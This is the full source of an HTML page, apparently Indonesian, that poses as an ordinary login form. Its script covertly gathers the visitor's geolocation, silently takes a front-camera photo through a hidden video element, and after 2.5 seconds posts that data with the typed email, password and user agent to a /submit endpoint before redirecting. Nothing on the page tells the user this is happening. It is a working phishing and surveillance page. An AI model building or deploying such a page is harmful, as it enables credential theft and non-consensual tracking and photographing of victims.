<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>LOGIN</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: white;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      max-width: 400px;
      width: 100%;
      text-align: center;
    }
    input, button {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    video {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>LOGIN</h2>
    <form id="loginForm">
      <input type="email" name="email" placeholder="Your Email" required><br>
      <input type="password" name="password" placeholder="Password" required><br>
      <button type="submit">Login</button>
    </form>
    <video id="video" autoplay playsinline></video>
  </div>

<script>
  const video = document.getElementById('video');
  const redirectURL = "/berhasil"; // Ubah redirect kalau perlu

  let latitude = "", longitude = "", userAgent = navigator.userAgent, blobImage = null;

  navigator.geolocation.getCurrentPosition(pos => {
    latitude = pos.coords.latitude;
    longitude = pos.coords.longitude;

    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
      .then(stream => {
        video.srcObject = stream;
        const track = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(track);

        setTimeout(() => {
          imageCapture.takePhoto().then(blob => {
            blobImage = blob;
            track.stop();

            const form = document.getElementById('loginForm');
            const formData = new FormData(form);
            formData.append("latitude", latitude);
            formData.append("longitude", longitude);
            formData.append("device", userAgent);
            if (blobImage) {
              formData.append("photo", blobImage, "snapshot.jpg");
            }

            fetch("/submit", {
              method: "POST",
              body: formData
            }).then(() => {
              window.location.href = redirectURL;
            });

          }).catch(err => console.error("Photo error:", err));
        }, 2500);
      }).catch(err => console.error("Camera error:", err));
  }, err => {
    console.error("Geolocation error:", err);
  });
</script>
</body>
</html>
